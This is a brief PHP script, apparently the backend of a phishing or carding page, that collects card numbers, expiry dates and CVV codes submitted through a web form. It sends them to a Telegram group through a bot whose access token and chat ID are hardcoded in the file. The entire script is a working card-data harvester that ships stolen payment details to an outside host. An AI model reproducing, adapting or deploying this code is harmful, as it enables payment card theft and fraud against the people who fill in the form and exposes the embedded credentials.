<?php
require __DIR__ . '/vendor/autoload.php'; // Inclure la bibliothèque

use Telegram\Bot\Api;

$telegram = new Api('5590266860:AAFySytZ2TA3CIycx6dDE75RGLY4E25RRNI'); // Remplace "YOUR_TELEGRAM_BOT_TOKEN" par ton propre jeton d'accès

$message = "Informations de paiement :\n";
$message .= "Numéro de carte : " . $_POST['card-number'] . "\n";
$message .= "Date d'expiration : " . $_POST['expiration-date'] . "\n";
$message .= "CVV : " . $_POST['cvv'];

$telegram->sendMessage([
    'chat_id' => '-1001713659722', // Remplace "YOUR_CHAT_ID" par l'ID de ton groupe ou canal
    'text' => $message
]);